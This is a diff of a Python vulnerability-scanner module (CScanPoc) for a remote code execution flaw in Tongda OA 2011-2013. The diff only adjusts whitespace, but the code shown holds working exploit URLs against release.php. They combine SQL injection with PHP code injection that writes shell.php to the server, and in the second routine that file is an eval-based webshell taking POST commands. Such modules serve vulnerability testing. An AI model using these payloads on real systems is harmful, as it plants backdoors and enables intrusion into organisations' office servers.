@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'TongdaOA_0013' # 平台漏洞编号，留空
+    vuln_id = 'TongdaOA_0013'  # 平台漏洞编号，留空
     name = '通达OA 2011-2013 通杀GETSHELL'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2013-02-01'  # 漏洞公布时间
     desc = '''
         通达OAT9智能管理平台是基于B/S架构，灵活、稳定、安全、高性能的办公系统。采用自主研发的引擎技术，提供强大的工作流和公文流程管理功能，可完全根据客户需求定制办公门户平台。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '通达OA系统'  # 漏洞应用名称
     product_version = '通达OA 2011-2013'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'ea03e8cd-b058-4bcf-882a-3014280edf77'
@@ -32,7 +34,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload1 = "/general/crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgZWNobyBtZDUoYyk7ID8+b2s=))}"
             payload2 = '/site/general/email/index.php'
             payload3 = '/general/email/shell.php'
@@ -54,7 +56,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload1 = "/general/crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgZWNobyBtZDUoYyk7QGV2YWwoJF9QT1NUW2NdKTs/Pm9r))}"
             payload2 = '/site/general/email/index.php'
             payload3 = '/general/email/shell.php'
@@ -71,6 +73,7 @@ class Poc(ABPoc):
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
+
 
 if __name__ == '__main__':
     Poc().run()
